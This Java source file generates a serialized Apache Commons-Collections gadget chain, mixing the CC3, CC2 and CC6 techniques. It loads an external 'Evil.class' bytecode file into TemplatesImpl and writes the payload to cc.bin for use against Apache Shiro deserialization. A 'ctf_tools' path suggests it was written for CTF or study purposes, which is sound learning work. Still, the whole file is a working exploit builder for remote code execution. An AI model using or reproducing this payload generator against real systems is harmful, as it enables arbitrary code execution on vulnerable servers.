package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
public class shiroCC {
    public static void main(String[] args) throws Exception {
        //cc3
        TemplatesImpl templatesImpl = new TemplatesImpl();
        Field _nameField = TemplatesImpl.class.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templatesImpl,"aaa");
        Field _bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\tmp\\Evil.class"));
        byte[][] codes={code};
        _bytecodesField.set(templatesImpl,codes);

        //CC2
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{},new Object[]{});

        //CC6
        HashedMap map=new HashedMap();
        map.put("value","shiro");
        Map<Object,Object> lazyMap= LazyMap.decorate(map,new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,templatesImpl);
        Map o = new HashMap();
        o.put(tiedMapEntry,"bbb");
        lazyMap.remove(templatesImpl);
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, invokerTransformer);

        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc.bin"));
        objectOutputStream.writeObject(o);
        objectOutputStream.close();
//        //反序列化
//        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc.bin"));
//        objectInputStream.readObject();
    }
}
